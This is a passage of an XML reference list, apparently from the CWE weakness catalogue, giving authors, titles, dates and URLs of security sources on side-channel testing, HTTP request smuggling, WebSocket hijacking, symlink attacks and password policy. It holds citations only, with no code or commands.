			<ns0:Title>FIPS PUB 140-2: SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</ns0:Title>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://csrc.nist.gov/publications/detail/fips/140/2/final</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1227">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Cryptographic primitive</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Cryptographic_primitive</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1228">
			<ns0:Author>Gilbert Goodwill</ns0:Author>
			<ns0:Author>Benjamin Jun</ns0:Author>
			<ns0:Author>Josh Jaffe</ns0:Author>
			<ns0:Author>Pankaj Rohatgi</ns0:Author>
			<ns0:Title>A testing methodology for side-channel resistance validation</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:URL>https://csrc.nist.gov/csrc/media/events/non-invasive-attack-testing-workshop/documents/08_goodwill.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1229">
			<ns0:Author>ISO/IEC</ns0:Author>
			<ns0:Title>ISO/IEC 17825:2016: Testing methods for the mitigation of non-invasive attack classes against cryptographic modules</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:URL>https://www.iso.org/standard/60612.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1230">
			<ns0:Author>Cryptography Research Inc.</ns0:Author>
			<ns0:Title>Test Vector Leakage Assessment (TVLA) Derived Test Requirements (DTR) with AES</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>https://www.rambus.com/wp-content/uploads/2015/08/TVLA-DTR-with-AES.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1231">
			<ns0:Author>Danilo &#352;ija&#711;ci&#180;</ns0:Author>
			<ns0:Author>Josep Balasch</ns0:Author>
			<ns0:Author>Bohan Yang</ns0:Author>
			<ns0:Author>Santosh Ghosh</ns0:Author>
			<ns0:Author>Ingrid Verbauwhede</ns0:Author>
			<ns0:Title>Towards efficient and automated side-channel evaluations at design time</ns0:Title>
			<ns0:Publication>Journal of Cryptographic Engineering, 10(4)</ns0:Publication>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:URL>https://www.esat.kuleuven.be/cosic/publications/article-3204.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1232">
			<ns0:Author>Amit Kumar</ns0:Author>
			<ns0:Author>Cody Scarborough</ns0:Author>
			<ns0:Author>Ali Yilmaz</ns0:Author>
			<ns0:Author>Michael Orshansky</ns0:Author>
			<ns0:Title>Efficient simulation of EM side-channel attack resilience</ns0:Title>
			<ns0:Publication>IEEE/ACM International Conference on Computer-Aided Design (ICCAD)</ns0:Publication>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:URL>https://dl.acm.org/doi/pdf/10.5555/3199700.3199717</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1233">
			<ns0:Author>Yuan Yao</ns0:Author>
			<ns0:Author>Tuna Tufan</ns0:Author>
			<ns0:Author>Tarun Kathuria</ns0:Author>
			<ns0:Author>Baris Ege</ns0:Author>
			<ns0:Author>Ulkuhan Guler</ns0:Author>
			<ns0:Author>Patrick Schaumont</ns0:Author>
			<ns0:Title>Pre-silicon Architecture Correlation Analysis (PACA): Identifying and Mitigating the Source of Side-channel Leakage at Gate-level</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---21</ns0:Publication_Day>
			<ns0:Publisher>IACR Cryptology ePrint Archive</ns0:Publisher>
			<ns0:URL>https://eprint.iacr.org/2021/530.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1234">
			<ns0:Author>Elisabeth Oswald</ns0:Author>
			<ns0:Author>Thomas Popp</ns0:Author>
			<ns0:Author>Stefan Mangard</ns0:Author>
			<ns0:Title>Power Analysis Attacks - Revealing the Secrets of Smart Cards</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:URL>https://link.springer.com/book/10.1007/978-0-387-38162-6</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1235">
			<ns0:Author>David Oswald</ns0:Author>
			<ns0:Author>Bastian Richter</ns0:Author>
			<ns0:Author>Christof Paar</ns0:Author>
			<ns0:Title>Side-Channel Attacks on the Yubikey 2 One-Time Password Generator</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://www.emsec.ruhr-uni-bochum.de/media/crypto/veroeffentlichungen/2014/02/04/paper_yubikey_sca.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1236">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>CAVP Testing: Individual Component Testing</ns0:Title>
			<ns0:URL>https://csrc.nist.gov/projects/cryptographic-algorithm-validation-program/component-testing</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1237">
			<ns0:Author>CERT Coordination Center</ns0:Author>
			<ns0:Title>Intel BIOS locking mechanism contains race condition that enables write protection bypass</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://www.kb.cert.org/vuls/id/766164/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1239">
			<ns0:Author>Fran&#231;ois-Xavier Standaert</ns0:Author>
			<ns0:Title>How (not) to Use Welch's T-test in Side-Channel Security Evaluations</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:Publisher>IACR Cryptology ePrint Archive</ns0:Publisher>
			<ns0:URL>https://eprint.iacr.org/2017/138.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1240">
			<ns0:Author>Carolyn Whitnall</ns0:Author>
			<ns0:Author>Elisabeth Oswald</ns0:Author>
			<ns0:Title>A Critical Analysis of ISO 17825 ('Testing methods for the mitigation of non-invasive attack classes against cryptographic modules')</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:Publisher>IACR Cryptology ePrint Archive</ns0:Publisher>
			<ns0:URL>https://eprint.iacr.org/2019/1013.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1241">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Network on a chip</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Network_on_a_chip</ns0:URL>
			<ns0:URL_Date>2021-10-24</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1242">
			<ns0:Author>Subodha Charles</ns0:Author>
			<ns0:Author>Prabhat Mishra</ns0:Author>
			<ns0:Title>A Survey of Network-on-Chip Security Attacks and Countermeasures</ns0:Title>
			<ns0:Publication>ACM Computing Surveys</ns0:Publication>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:URL>https://dl.acm.org/doi/fullHtml/10.1145/3450964</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1243">
			<ns0:Author>Bruce Schneier</ns0:Author>
			<ns0:Title>Cryptanalysis of SHA-1</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://www.schneier.com/blog/archives/2005/02/cryptanalysis_o.html</ns0:URL>
			<ns0:URL_Date>2021-10-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1244">
			<ns0:Author>Dan Goodin</ns0:Author>
			<ns0:Title>At death's door for years, widely used SHA1 function is now dead</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:Publisher>Ars Technica</ns0:Publisher>
			<ns0:URL>https://arstechnica.com/information-technology/2017/02/at-deaths-door-for-years-widely-used-sha1-function-is-now-dead/</ns0:URL>
			<ns0:URL_Date>2021-10-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1245">
			<ns0:Author>Subodha Charles</ns0:Author>
			<ns0:Title>Design of Secure and Trustworthy Network-on-chip Architectures</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:URL>https://www.cise.ufl.edu/research/cad/Publications/charlesThesis.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1246">
			<ns0:Author>National Telecommunications and Information Administration</ns0:Author>
			<ns0:Title>SOFTWARE BILL OF MATERIALS</ns0:Title>
			<ns0:URL>https://ntia.gov/page/software-bill-materials</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1247">
			<ns0:Author>NTIA Multistakeholder Process on Software Component Transparency Framing Working Group</ns0:Author>
			<ns0:Title>Framing Software Component Transparency: Establishing a Common Software Bill of Materials (SBOM)</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---21</ns0:Publication_Day>
			<ns0:URL>https://www.ntia.gov/files/ntia/publications/ntia_sbom_framing_2nd_edition_20211021.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1248">
			<ns0:Author>Securing Energy Infrastructure Executive Task Force (SEI ETF)</ns0:Author>
			<ns0:Title>Categories of Security Vulnerabilities in ICS</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://inl.gov/wp-content/uploads/2022/03/SEI-ETF-NCSV-TPT-Categories-of-Security-Vulnerabilities-ICS-v1_03-09-22.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1249">
			<ns0:Author>Dawid Golunski</ns0:Author>
			<ns0:Title>PHPMailer &lt; 5.2.18 Remote Code Execution [CVE-2016-10033]</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1250">
			<ns0:Author>Dawid Golunski</ns0:Author>
			<ns0:Title>Pwning PHP mail() function For Fun And RCE</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1251">
			<ns0:Author>Drew Branch</ns0:Author>
			<ns0:Title>WebSockets not Bound by SOP and CORS? Does this mean...</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1252">
			<ns0:Author>Mehul Mohan</ns0:Author>
			<ns0:Title>How to secure your WebSocket connections</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:URL>https://www.freecodecamp.org/news/how-to-secure-your-websocket-connections-d0be0996c556/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1253">
			<ns0:Author>PortSwigger</ns0:Author>
			<ns0:Title>Testing for WebSockets security vulnerabilities</ns0:Title>
			<ns0:URL>https://portswigger.net/web-security/websockets</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1254">
			<ns0:Author>FDA</ns0:Author>
			<ns0:Title>Cybersecurity in Medical Devices: Quality System Considerations and Content of Premarket Submissions Draft Guidance for Industry and Food and Drug Administration Staff (DRAFT GUIDANCE)</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://www.fda.gov/media/119933/download</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1255">
			<ns0:Author>Sergei P. Skorobogatov</ns0:Author>
			<ns0:Title>Semi-invasive attacks - A new approach to hardware security analysis</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:URL>https://www.cl.cam.ac.uk/techreports/UCAM-CL-TR-630.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1256">
			<ns0:Author>Vickie Li</ns0:Author>
			<ns0:Title>Cross-Site WebSocket Hijacking (CSWSH)</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:URL>https://medium.com/swlh/hacking-websocket-25d3cba6a4b9</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1257">
			<ns0:Author>Christian Schneider</ns0:Author>
			<ns0:Title>Cross-Site WebSocket Hijacking (CSWSH)</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>https://christian-schneider.net/CrossSiteWebSocketHijacking.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1262">
			<ns0:Author>Eran Shimony</ns0:Author>
			<ns0:Title>Follow the Link: Exploiting Symbolic Links with Ease</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://www.cyberark.com/resources/threat-research-blog/follow-the-link-exploiting-symbolic-links-with-ease</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1264">
			<ns0:Author>James Forshaw</ns0:Author>
			<ns0:Title>Windows 10^H^H Symbolic Link Mitigations</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1265">
			<ns0:Title>Symbolic testing tools</ns0:Title>
			<ns0:URL>https://github.com/googleprojectzero/symboliclink-testing-tools</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1266">
			<ns0:Author>Shubham Dubey</ns0:Author>
			<ns0:Title>Understanding and Exploiting Symbolic links in Windows - Symlink Attack EOP</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1267">
			<ns0:Author>Simon Zuckerbraun</ns0:Author>
			<ns0:Title>Abusing Arbitrary File Deletes to Escalate Privilege and Other Great Tricks</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---17</ns0:Publication_Day>
			<ns0:URL>https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1271">
			<ns0:Author>Cl&#233;ment Lavoillotte</ns0:Author>
			<ns0:Title>Abusing privileged file operations</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://troopers.de/troopers19/agenda/7af9hw/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1272">
			<ns0:Author>Robert Auger</ns0:Author>
			<ns0:Title>HTTP Request Splitting</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>http://projects.webappsec.org/w/page/13246929/HTTP%20Request%20Splitting</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1273">
			<ns0:Author>Robert Auger</ns0:Author>
			<ns0:Title>HTTP Response Smuggling</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>http://projects.webappsec.org/w/page/13246930/HTTP%20Response%20Smuggling</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1274">
			<ns0:Author>Dzevad Alibegovic</ns0:Author>
			<ns0:Title>HTTP Request Smuggling: Complete Guide to Attack Types and Prevention</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://brightsec.com/blog/http-request-smuggling-hrs/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1275">
			<ns0:Author>Busra Demir</ns0:Author>
			<ns0:Title>A Pentester's Guide to HTTP Request Smuggling</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1276">
			<ns0:Author>Edi Kogan</ns0:Author>
			<ns0:Author>Daniel Kerman</ns0:Author>
			<ns0:Title>HTTP Desync Attacks in the Wild and How to Defend Against Them</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---29</ns0:Publication_Day>
			<ns0:URL>https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1277">
			<ns0:Author>James Kettle</ns0:Author>
			<ns0:Title>HTTP Desync Attacks: Request Smuggling Reborn</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1278">
			<ns0:Author>PortSwigger</ns0:Author>
			<ns0:Title>HTTP request smuggling</ns0:Title>
			<ns0:URL>https://portswigger.net/web-security/request-smuggling</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1279">
			<ns0:Author>CWE/CAPEC</ns0:Author>
			<ns0:Title>Neutralizing Your Inputs: A Log4Shell Weakness Story</ns0:Title>
			<ns0:URL>https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1280">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Expression Language Injection</ns0:Title>
			<ns0:URL>https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1281">
			<ns0:Author>Douglas N. Arnold</ns0:Author>
			<ns0:Title>The sinking of the Sleipner A offshore platform</ns0:Title>
			<ns0:URL>https://www-users.cse.umn.edu/~arnold/disasters/sleipner.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1282">
			<ns0:Author>Snyk</ns0:Author>
			<ns0:Title>Zip Slip Vulnerability</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://security.snyk.io/research/zip-slip-vulnerability</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1283">
			<ns0:Author>Forescout Vedere Labs</ns0:Author>
			<ns0:Title>OT:ICEFALL: The legacy of "insecure by design" and its implications for certifications and risk management</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://www.forescout.com/resources/ot-icefall-report/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1284">
			<ns0:Author>Sick Codes</ns0:Author>
			<ns0:Title>Universal "netmask" npm package, used by 270,000+ projects, vulnerable to octal input data</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://sick.codes/universal-netmask-npm-package-used-by-270000-projects-vulnerable-to-octal-input-data-server-side-request-forgery-remote-file-inclusion-local-file-inclusion-and-more-cve-2021-28918/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1285">
			<ns0:Author>Texas Instruments</ns0:Author>
			<ns0:Title>Physical Security Attacks Against Silicon Devices</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---31</ns0:Publication_Day>
			<ns0:URL>https://www.ti.com/lit/an/swra739/swra739.pdf?ts=1644234570420</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1286">
			<ns0:Author>Lennert Wouters</ns0:Author>
			<ns0:Author>Benedikt Gierlichs</ns0:Author>
			<ns0:Author>Bart Preneel</ns0:Author>
			<ns0:Title>On The Susceptibility of Texas Instruments SimpleLink Platform Microcontrollers to Non-Invasive Physical Attacks</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://eprint.iacr.org/2022/328.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1287">
			<ns0:Author>MITRE</ns0:Author>
			<ns0:Title>Supplemental Details - 2022 CWE Top 25</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25_supplemental.html#problematicMappingDetails</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1288">
			<ns0:Author>Julia Lokrantz</ns0:Author>
			<ns0:Title>Ethical hacking of a Smart Automatic Feed Dispenser</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>http://kth.diva-portal.org/smash/get/diva2:1561552/FULLTEXT01.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1289">
			<ns0:Author>Lance Spitzner</ns0:Author>
			<ns0:Title>Time for Password Expiration to Die</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:URL>https://www.sans.org/blog/time-for-password-expiration-to-die/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1290">
			<ns0:Author>Lorrie Cranor</ns0:Author>
			<ns0:Title>Time to rethink mandatory password changes</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>https://www.ftc.gov/policy/advocacy-research/tech-at-ftc/2016/03/time-rethink-mandatory-password-changes</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1291">
			<ns0:Author>Eugene Spafford</ns0:Author>
			<ns0:Title>Security Myths and Passwords</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://www.cerias.purdue.edu/site/blog/post/password-change-myths/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1292">
			<ns0:Author>National Cyber Security Centre</ns0:Author>
			<ns0:Title>Password administration for system owners</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://www.ncsc.gov.uk/collection/passwords</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1293">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>Digital Identity Guidelines: Authentication and Lifecycle Management(SP 800-63B)</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:URL>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1294">
			<ns0:Author>National Cyber Security Centre</ns0:Author>
			<ns0:Title>Let them paste passwords</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>https://www.ncsc.gov.uk/blog-post/let-them-paste-passwords</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1295">
			<ns0:Author>WizCase</ns0:Author>
			<ns0:Title>Over 80 US Municipalities' Sensitive Information, Including Resident's Personal Data, Left Vulnerable in Massive Data Breach</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://www.wizcase.com/blog/us-municipality-breach-report/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1296">
			<ns0:Author>Jonathan Greig</ns0:Author>
			<ns0:Title>1,000 GB of local government data exposed by Massachusetts software company</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://www.zdnet.com/article/1000-gb-of-local-government-data-exposed-by-massachusetts-software-company/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1297">
			<ns0:Author>Amazon</ns0:Author>
